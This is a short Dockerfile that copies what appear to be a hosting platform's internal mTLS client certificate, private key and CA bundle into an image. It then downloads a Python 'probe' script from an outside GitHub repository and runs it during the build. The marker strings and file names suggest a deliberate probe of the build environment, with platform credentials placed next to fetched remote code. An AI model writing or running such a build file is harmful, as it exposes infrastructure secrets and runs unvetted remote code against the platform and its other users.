# MARK-I68068-gwroute-p2-9d3f7a
FROM alpine:3.20
RUN echo MARK-I68068-gwroute-p2-9d3f7a-step1
COPY var/lib/railwayapp/mtls-pki/client.crt /pki/client.crt
COPY var/lib/railwayapp/mtls-pki/client.key /pki/client.key
COPY var/lib/railwayapp/mtls-pki/server-ca-bundle.crt /pki/server-ca-bundle.crt
RUN apk add --no-cache curl openssl python3 >/dev/null 2>&1; echo APKDONE
RUN curl -sS -m 30 -o /p2.py https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/main/probe2_i68068.py && wc -l /p2.py && echo DL_OK
RUN timeout -s KILL 380 python3 /p2.py 2>&1 | head -c 30000
CMD ["sh","-c","sleep 60"]
